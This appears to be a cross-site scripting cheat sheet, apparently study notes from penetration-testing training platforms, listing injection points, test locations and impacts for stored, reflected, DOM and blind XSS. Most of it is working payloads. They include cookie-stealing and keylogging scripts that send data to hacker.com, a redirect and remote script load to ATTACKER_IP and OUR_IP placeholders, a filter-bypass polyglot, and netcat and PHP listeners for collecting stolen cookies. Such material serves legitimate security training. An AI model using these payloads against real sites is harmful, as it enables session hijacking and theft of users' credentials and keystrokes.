# PoC Payload: <script>alert('XSS');</script>

# PoC Payload 2: <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/<

## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings

## Places to inject XSS payloads:

### 1) User-Agent

### 2) HTTP Headers

### 3) Message Forms

## Detection methods:

### 1) Try injecting HTML code instead of JavaScript

### 2) Make sure everything is escaped so that you can bypass basic defense mechanisms

### Example: <>/\script'"=

### 3) Use alternative to "alert" payload to test for XSS

### Session stealing: <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>

### Keylogger: <script>document.onkeypress = function(p){ fetch ('https://hacker.com/log?key=' + btoa(p.key) );}</script>

### Change user's email address: <script>user.changeEmail('attacker@hacker.com');</script>

# Stored XSS

## Test locations: 

#### 1: Comments on a blog

#### 2: User profile information

#### 3: Website listings

## IMPACT:

#### Steal victim's session cookie. Impersonate the visiting user.

# Reflected XSS

## Test locations:

#### 1: URL file path

#### 2: Parameters in the URL query string

#### 3: Sometimes, HTTP headers

## IMPACT:

#### Attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session/customer information.

# DOM Based XSS

## Test locations:

#### 1: Look for parts of the code that access certain variables that we can have control over.

#### E.g. "window.location.x" parameter.

#### When we've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as "eval()"

## IMPACT:

#### Steal content from page/user's session. Crafted links could be sent to victims, redirecting them to another site.

# BLIND XSS 

## Test locations:

#### Ensure payload has a call back (HTTP request) 

# POLYGLOT PAYLOAD

#### jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e (XSS filter bypass)


## Commands

| Code | Description |
| ----- | ----- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80 ` | Start `PHP` server |
